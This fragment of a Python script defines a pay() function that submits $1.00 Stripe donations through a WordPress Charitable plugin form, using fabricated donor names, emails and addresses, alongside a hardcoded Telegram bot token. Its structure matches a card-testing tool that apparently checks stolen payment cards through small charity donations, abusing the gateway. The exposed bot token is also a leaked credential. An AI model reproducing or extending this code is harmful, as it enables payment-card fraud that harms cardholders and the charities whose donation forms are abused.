...
BOT_TOKEN = '8075455874:AAGxl7ELCNce4BJtvMn8pDqb2TPr6oPPBrk'
...
def pay(session, ua, fid, nonce, cid, pm, fake):
    ...
    # Include all required fields as identified by the gateway error message
    data = {
        'charitable_form_id': fid,
        fid: '', # This field is typically empty but required by the plugin structure
        '_charitable_donation_nonce': nonce,
        '_wp_http_referer': '/donate/',
        'campaign_id': cid,
        'description': 'CC Foundation Donation',
        'ID': '0',
        'donation_amount': 'custom',
        'custom_donation_amount': '1.00',
        'recurring_donation': 'once',
        'title': random.choice(['Mr', 'Mrs', 'Ms', 'Dr']), # Restored: Title
        'first_name': fn,
        'last_name': ln,
        'email': f"{fn.lower()}.{ln.lower()}{random.randint(100, 999)}@gmail.com",
        'address': fake.street_address(), # Restored: Address Line 1
        'postcode': fake.zipcode(), # Restored: Postcode
        'city': fake.city(),
        'country': 'US',
        'gateway': 'stripe',
